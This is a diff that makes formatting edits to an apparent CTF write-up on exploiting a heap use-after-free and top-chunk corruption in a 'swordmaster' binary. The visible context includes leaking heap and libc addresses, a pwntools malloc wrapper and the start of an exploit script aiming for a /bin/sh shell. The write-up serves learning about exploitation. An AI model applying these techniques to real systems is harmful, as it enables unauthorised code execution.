@@ -96,9 +96,9 @@ As shown above, our "Class" now seems to contain garbage data instead of "Mage".
 
 ![heap struct](heap_struct_uaf.png)
 
-NOTE: the free'd chunks still show up in the heap chunks due to internals of glibc. We can confirm they have actually been free'd by observing them in the tcache. Future posts will discuss glibc internals more, but for now it is outside the scope of this already long post.
 
-![tchache](tcache.png)
+> The free'd chunks still show up in the heap chunks because of the tcache. Future posts will go into further details on the glibc internals.
+{: .prompt-info }
 
 You may notice that these hex values are the address of the previous chunk and the address of the first chunk respectively, thus leaking the address of the heap. I spent a while on this bug seeing if there was any way to weaponize it more, but the leak is the only primative it gives us. This will be helpful to bypass ASLR, but we will need another bug (or two) in order to craft an exploit.
 
@@ -142,7 +142,7 @@ Through a fairly boring and far-too-long manual process, I was able to determine
 
 Then to determine our base address, we need to subtract `0x21c87`: 
 
-`0x00007ffff7a03c87 - 0x21c87 = 0x7ffff79e2000 = libc base
+`0x00007ffff7a03c87 - 0x21c87 = 0x7ffff79e2000 = libc base`
 
 Nice, we now have everything we need to write an exploit!
 
@@ -200,12 +200,12 @@ heap = int.from_bytes(heap, 'little') - 4800 - 0x10
 Now it's time to start the heap exploitation process. To make matters simplier, we can write a wrapper around the craft sword program interaction. 
 ```python
 def malloc(size, data):  
-    p.recvuntil(b'>> ')  
-    p.sendline(b'1')  
-    p.recvuntil(b'>> ')  
-    p.sendline(str(size))  
-    p.recvuntil(b'>> ')  
-    p.sendline(data)
+  p.recvuntil(b'>> ')  
+  p.sendline(b'1')  
+  p.recvuntil(b'>> ')  
+  p.sendline(str(size))  
+  p.recvuntil(b'>> ')  
+  p.sendline(data)
 ```
 
 Now we need to corrupt the top chunk size. We can do this programatically the same way we did manually earlier:
@@ -242,8 +242,8 @@ Last step, we need to get a pointer to our name, `/bin/sh\0`. This is always loc
 from pwn import *  
 import sys  
 if not sys.warnoptions:  
-    import warnings  
-    warnings.simplefilter("ignore")  
+  import warnings  
+  warnings.simplefilter("ignore")  
   
 elf = ELF("./swordmaster")  
 libc = ELF("./glibc/libc.so.6")  
@@ -277,12 +277,12 @@ heap = int.from_bytes(heap, 'little') - 4800 - 0x10
 [log.info](http://log.info/)("LEAKED HEAP BASE: " + str(hex(heap)))  
   
 def malloc(size, data):  
-    p.recvuntil(b'>> ')  
-    p.sendline(b'1')  
-    p.recvuntil(b'>> ')  
-    p.sendline(str(size))  
-    p.recvuntil(b'>> ')  
-    p.sendline(data)  
+  p.recvuntil(b'>> ')  
+  p.sendline(b'1')  
+  p.recvuntil(b'>> ')  
+  p.sendline(str(size))  
+  p.recvuntil(b'>> ')  
+  p.sendline(data)  
   
   
   
